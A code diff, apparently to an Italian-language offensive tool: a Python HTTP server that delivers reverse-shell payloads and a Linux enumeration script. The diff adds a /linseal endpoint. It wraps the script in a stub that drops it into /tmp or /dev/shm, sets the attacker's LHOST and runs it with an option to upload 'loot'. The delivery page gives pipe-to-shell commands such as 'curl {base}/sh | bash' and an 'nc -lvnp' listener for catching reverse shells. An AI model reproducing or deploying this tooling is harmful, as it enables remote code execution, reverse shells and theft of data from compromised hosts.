@@ -38,6 +38,11 @@ _log_lock = threading.Lock()
 _LOG_MAX = 500
 
 
+def parsed_query_flags(raw_path: str) -> str:
+    q = raw_path.split("?", 1)[1] if "?" in raw_path else ""
+    return q.split("&")[0].split("=")[0] if q else ""
+
+
 def set_lport(port: int) -> str:
     global _lport
     if not (1 <= port <= 65535):
@@ -2000,8 +2005,8 @@ def _page_delivery() -> str:
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
          f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
-        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: -o [file] salva output, -s silenzioso, -l upload in loot",
-         f"curl {base}/static/linseal.sh | sh -s -- -o -l",
+        ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
+         f"curl {base}/linseal?ol | sh",
          "Nessun prerequisito — POSIX sh puro"),
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
@@ -2256,6 +2261,8 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_text(REVSHELL_BASH.format(**pv))
         elif path == "/sh":
             self._send_text(REVSHELL_PYTHON.format(**pv))
+        elif path == "/linseal":
+            self._serve_linseal(qs)
         elif path == "/api/search":
             q = qs.get("q", [""])[0]
             results = _search_all(q)
@@ -2591,6 +2598,37 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             self._send_json({"ok": False, "error": msg}, status=400)
         else:
             self._send_json({"ok": True, "lport": _lport})
+
+    def _serve_linseal(self, qs: dict) -> None:
+        script_path = STATIC_ROOT / "linseal.sh"
+        if not script_path.is_file():
+            self.send_error(404, "linseal.sh non trovato in static/")
+            return
+        try:
+            script = script_path.read_text(encoding="utf-8")
+        except OSError:
+            self.send_error(500)
+            return
+
+        flags = qs.get("f", [""])[0] if "f" in qs else parsed_query_flags(self.path)
+        args_line = ""
+        if flags:
+            parts = []
+            if "o" in flags:
+                parts.append("-o")
+            if "s" in flags:
+                parts.append("-s")
+            if "l" in flags:
+                parts.append("-l")
+            if parts:
+                args_line = " ".join(parts)
+
+        if args_line:
+            wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\n"$_LINSEAL_SELF" {args_line}\n'
+        else:
+            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\n' + script
+
+        self._send_text(wrapper)
 
     def _serve_loot_raw(self, name: str) -> None:
         if ".." in name or "/" in name or "\\" in name:
